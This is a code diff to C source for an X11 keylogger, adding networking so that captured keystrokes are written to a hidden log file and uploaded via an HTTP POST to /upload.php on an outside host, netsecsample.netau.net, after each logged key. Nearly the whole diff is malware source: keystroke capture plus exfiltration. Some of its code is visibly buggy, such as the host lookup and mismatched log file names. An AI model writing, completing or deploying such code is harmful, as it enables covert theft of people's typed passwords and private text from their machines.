@@ -1,11 +1,19 @@
 #include <pthread.h>
 #include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
 #include <X11/Xlib.h>
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
+#include <errno.h>
+#include <arpa/inet.h>
 #include <X11/keysym.h>
+
+int lock = 0;
 
 int bit(unsigned char i) 
 {
@@ -91,13 +99,96 @@ void logfile (char ch)
 {
 	FILE 	*file;
 
+	while (lock) sleep(100);
 	if (ch != '\0') {
-		if((file = fopen(".log1.log", "a+")) != NULL)
+		if((file = fopen(".log.log", "a+")) != NULL)
 		{
+		  	lock = 1;
 		  	fputc(ch, file);
 		  	fclose(file);
 		}
 	}
+	lock = 0;
+}
+
+
+int submit()
+{
+    int sockfd = 0, n = 0;
+    char recvBuff[1024];
+    struct sockaddr_in serv_addr;
+
+    memset(recvBuff, '0',sizeof(recvBuff));
+    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        //printf("\n Error : Could not create socket \n");
+        return 0;
+    }
+
+    memset(&serv_addr, '0', sizeof(serv_addr));
+
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(80);
+    serv_addr.sin_addr.s_addr = gethostbyname("netsecsample.netau.net");
+
+    if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
+       //printf("\n Error : Connect Failed \n");
+       return 0;
+
+    return sockfd;
+}
+
+void upload()
+{
+    FILE*       file;
+    char        buf[4096];
+    int         size, n, i, socket, fsize;
+    char        header[] =  "POST /upload.php HTTP/1.0\r\n"
+                            "Host: netsecsample.netau.net\r\n"
+                            "Content-Type: multipart/form-data; boundary=1727381797619608628249622620\r\n"
+                            "Connection: keep-alive\r\n"
+                            "Content-Length: %d\r\n\r\n";
+
+    char        startbuf[] = "--1727381797619608628249622620\r\n"
+                             "Content-Disposition: form-data; name=\"file\"; filename=\"log.txt\"\r\n"
+                             "Content-Type: text/plain\r\n\r\n";
+
+    char 		endbuf[]   = "\r\n--1727381797619608628249622620--";
+
+    if((file = fopen(".log1.log", "r")) != NULL) {
+    	lock = 1;
+        fseek(file, 0L, SEEK_END);
+        fsize = ftell(file);
+
+        if (fsize < 512) {
+        	fclose(file);
+        	return;
+        }
+        socket = submit();
+
+        memset(buf, '\0', sizeof(buf));
+        sprintf(buf, header, sizeof(startbuf) + sizeof(endbuf) + fsize);
+
+        send(socket, buf, strlen(buf), 0);
+        send(socket, startbuf, sizeof(startbuf), 0);
+
+        rewind(file);
+        while (!feof(file)) {
+            memset(buf, '\0', sizeof(buf));
+            fread(buf, sizeof(buf), 1, file);
+            size = strlen(buf);
+            for (i=0;;) {
+                n = send(socket, buf+i, size-i, 0);
+                if (n == 0) break;
+                i += n;
+            }
+
+        }
+        send(socket, endbuf, sizeof(endbuf), 0);
+        fclose(file);
+        remove(".log.log");
+        lock = 0;
+        read(socket, buf, sizeof(buf)-1);
+    }
 }
 
 void log1(char *buf, int masked,  char *c, int caps)
@@ -129,10 +220,11 @@ void log1(char *buf, int masked,  char *c, int caps)
 			*c=*buf;
 	}
 
-	err = pthread_create(&tid, NULL, &logfile, (void*)*c);
+	err = pthread_create(&tid, NULL, &logfile, *c);
 	if (err !=0 ) // did not create the thread? try direcly
 		logfile(*c);
 
+	upload();
 	printf("%c", *c);
 }
 
@@ -178,79 +270,32 @@ int main()
 						if (keycode == 50 || keycode == 62) {
 							// shift is down
 							masked = 1;
-						} else if (keycode == 37 || keycode == 105) {
-							keyname = "CTRL Down";
-						} else if (keycode == 133) {
-							keyname = "WinKey Down";
-						} else if (keycode == 108) {
-							keyname = "WinKey Down";
-						} else if (keycode == 64) {
-							keyname = "ALT GR Down";
-						} else if (keycode == 34) {
-							keyname = "ALT Down";
-						} else if (keycode == 48) {
-							keyname = "å";
-						} else if (keycode == 47) {
-							keyname = "ö";
 						} else if (keycode == 22) {
-							keyname = "BKSPS";
+							keyname = "backspace";
 						} else if (keycode == 66) {
 							// caps lock
 							caps = !caps;
 						} else if (keycode == 23) {
-							keyname = "TAB";
-						} else if (keycode == 67) {
-							keyname = "F1";
-						} else if (keycode == 68) {
-							keyname = "F2";
-						} else if (keycode == 69) {
-							keyname = "F3";
-						} else if (keycode == 70) {
-							keyname = "F4";
-						} else if (keycode == 71) {
-							keyname = "F5";
-						} else if (keycode == 72) {
-							keyname = "F6";
-						} else if (keycode == 73) {
-							keyname = "F7";
-						} else if (keycode == 74) {
-							keyname = "F8";
-						} else if (keycode == 76) {
-							keyname = "F9";
-						} else if (keycode == 95) {
-							keyname = "F10";
-						} else if (keycode == 96) {
-							keyname = "F11";
-						} else if (keycode == 9) {
-							keyname = "F12";
+							keyname = "tab";
 						} else if (keycode == 36 || keycode == 104) {
-							keyname = "ENTER";
+							keyname = "return";
 						}
 
-						//log1(keyname, masked);
-						//printf("%s", keyname);
+						log1(keyname, masked, &current, caps);
 					}
 					else {
 						if (strcmp(keyname, "Q") == 0) {
-							keyname = "LEFT";
+							keyname = "";
 						} else if (strcmp(keyname, "S") == 0) {
-							keyname = "RIGHT";
+							keyname = "";
 						} else if (strcmp(keyname, "R") == 0) {
-							keyname = "UP";							
+							keyname = "";
 						} else if (strcmp(keyname, "T") == 0) {
-							keyname = "DOWN";	
-						} /*else if (strcmp(keyname, "space") == 0) {
-							keyname = " ";
-						} else if (strcmp(keyname, "comma") == 0) {
-							keyname = ",";							
-						} else if (strcmp(keyname, "apostrophe") == 0) {
-							keyname = "\"";							
-						} else if (strcmp(keyname, "period") == 0) {
-							keyname = ".";							
-						} */
+							keyname = "";
+						}
 
 						log1(keyname, masked, &current, caps);
-						//printf("%s", keyname);
+
 					} 
 				}
 				else {
@@ -258,20 +303,8 @@ int main()
 					if(keycode == 50 || keycode == 62) {
 						// shift is up
 						masked = 0;
-					} else current=0;
-
-					/* else if (keycode == 37 || keycode == 105) {
-						keyname = "CTRL Up";	
-					} else if (keycode == 133) {
-						keyname = "WinKey Up";
-					} else if (keycode == 108) {
-						keyname = "ALT GR Up";
-					} else if (keycode == 64) {
-						keyname = "ALT Up";	
-					}
-					//printf("%s", keyname);
-					*/
-					//printf("%i", keycode);
+					} else
+						current=0;
 				}
 				szKeyOld[i] = szKey[i];				
 			}
